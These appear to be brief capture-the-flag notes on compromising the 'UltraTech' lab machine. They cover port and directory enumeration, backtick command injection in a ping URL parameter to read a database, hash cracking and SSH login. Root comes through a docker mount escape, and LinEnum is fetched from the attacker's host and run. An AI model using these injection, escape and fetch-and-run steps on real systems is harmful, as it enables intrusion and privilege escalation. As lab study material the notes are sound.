### Enumeration
```
nmap -sV -p 8081,31331 <IP_ADDRESS>
gobuster dir -u http://<IP_ADDRESS>:8081 -w /usr/share/wordlists/dirb/common.txt
http://ultratech_ip:8081/ping?ip=%60ls%60
http://ultratech_ip:8081/ping?ip=%60cat%20utech.db.sqlite%60
```
### Login
```
Go to Crackstation to crack the password hashes
ssh r00t@IP
```
### Execution
```
docker images
docker run -v /:/mnt --rm -it bash chroot /mnt /bin/sh
#whoami
```
### Installing Linenum on Ultratech
```
On Kali,
cd ~/Downloads
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
python3 -m http.server 80

On Ultratech,
cd /tmp
wget http://<YOUR_KALI_IP>:80/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

